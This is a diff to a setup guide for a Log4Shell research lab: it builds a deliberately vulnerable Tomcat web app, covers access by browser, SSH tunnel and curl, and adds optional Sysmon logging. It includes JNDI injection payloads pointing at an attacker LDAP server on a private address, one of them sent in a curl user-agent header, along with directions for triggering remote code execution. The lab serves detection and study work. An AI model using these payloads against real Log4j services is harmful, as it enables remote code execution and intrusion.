@@ -36,18 +36,7 @@ Check if the `Tomcat` service is running properly.
 service tomcat status
 ```
 
-## Install Sysmon for Linux
-
-Download the following Sysmon for Linux bash script to automate the installation and configuration:
-
-```bash
-wget https://raw.githubusercontent.com/OTRF/Blacksmith/master/resources/scripts/bash/Install-Sysmon-For-Linux.sh
-chmod +x Install-Sysmon-For-Linux.sh
-
-sh Install-Sysmon-For-Linux.sh --config https://raw.githubusercontent.com/OTRF/Blacksmith/master/resources/configs/sysmon/linux/sysmon.xml
-```
-
-## Install Docker
+### Install Docker
 
 We are going to use a Docker image to compile our vulnerable application. You can use this script to install the latest Docker app in your Linux VM.
 
@@ -58,22 +47,21 @@ chmod +x Install-Docker.sh
 ./Install-Docker.sh
 ```
 
-## Compile Vulnerable Application
+### Compile Vulnerable Application
 
-We want to create a `.war` file to host the vulnerable aplication in our Tomcat server.
+We need to add a vulnerable application to our Tomcat server. This project also comes with one.
+We need to compile our application and create a `.war` file to host the vulnerable aplication in our Tomcat server under `/opt/tomcat/webapps`.
 
 ```bash
 cd httpLoginForm/
 docker run -it --rm -v "$(pwd)":/opt/maven -w /opt/maven maven mvn clean install
 ```
 
-Copy `.war` file from the `target` folder to the Tomcat `/opt/tomcat/webapps/` folder.
+Copy new `.war` file from the `target` folder to the Tomcat `/opt/tomcat/webapps/` folder.
 
 ```bash
 cp target/VulnWebApp-1.0-SNAPSHOT.war /opt/tomcat/webapps/
 ```
-
-## Finish Setup
 
 ### Restart Tomcat Service
 
@@ -84,20 +72,48 @@ service tomcat start
 
 ### Access Vulnerable Web App
 
-* You can simply browse to `http://localhost:8080/VulnWebApp-1.0-SNAPSHOT/` if your Linux VM has a GUI.
-* If your Linux VM does not have a GUI and you can only use the terminal, you can SSH tunnel your access to your vulnerable application:
+The application can be accessed via your favorite browser or directly via curl commands (API style).
+There are two scenarios currently being covered:
+* Message Lookup
+* Thread Context
+
+**Browser**
+* If your Linux VM has a GUI, you can simply browse to `http://localhost:8080/VulnWebApp-1.0-SNAPSHOT/`.
+* If your Linux VM does not have a GUI and you can only use the terminal, you can SSH tunnel your access to your vulnerable application. Simply run the following commands in a new terminal.
 
 ```bash
-ssh -L 8080:127.0.0.1:8080 wardog@1.2.3.4
+ssh -L 8080:127.0.0.1:8080 wardog@[Public-IP-Linux-VM]
 ```
+
+* You must use the `password` field to pass a `JNDI lookup` string to trigger the vulnerability.
+* By default, the vulnerable application will use the `Message Lookup` method.
+* If you want to choose what method to use to trigger the RCE, you just need to use the following strings in the `email` field:
+    * An email address that starts with `msglookup@`
+    * An email address that starts with `threadcontext@`
 
 ![](../resources/images/log4jshell-lab-vuln-webapp.png)
 
-## Basic Test
+**API - Curl Commands**
+* You can also SSH to your Tomcat server and interact with the application's basic API.
+* The API exposes two methods over `GET` requests:
+    * `127.0.0.1:8080/VulnWebApp-1.0-SNAPSHOT/api/msglookup`
+    * `127.0.0.1:8080/VulnWebApp-1.0-SNAPSHOT/api/threadcontext`
+* Both methods require you to pass the `JNDI lookup` string via the `user-agent` header of the `GET` request.
 
-If you have an "`attacker`" server up and running, simply craft your `JNDI Lookup` string and use it in the `password` field of the application `login form` hosted by your vulnerable application in your Tomcat server.
+```bash
+curl -X GET -H 'user-agent: ${jndi:ldap://192.168.2.6:1389#Run}' 127.0.0.1:8080/VulnWebApp-1.0-SNAPSHOT/api/threadcontext
+```
 
-**Example:** `${jndi:ldap://192.168.2.6:1389/Run}`
+## Install Sysmon for Linux
+
+If you want to generate some endpoint data, download the following Sysmon for Linux bash script to automate the installation and configuration of it:
+
+```bash
+wget https://raw.githubusercontent.com/OTRF/Blacksmith/master/resources/scripts/bash/Install-Sysmon-For-Linux.sh
+chmod +x Install-Sysmon-For-Linux.sh
+
+sh Install-Sysmon-For-Linux.sh --config https://raw.githubusercontent.com/OTRF/Blacksmith/master/resources/configs/sysmon/linux/sysmon.xml
+```
 
 ## Reference
 * https://linuxize.com/post/how-to-install-tomcat-8-5-on-ubuntu-18-04/
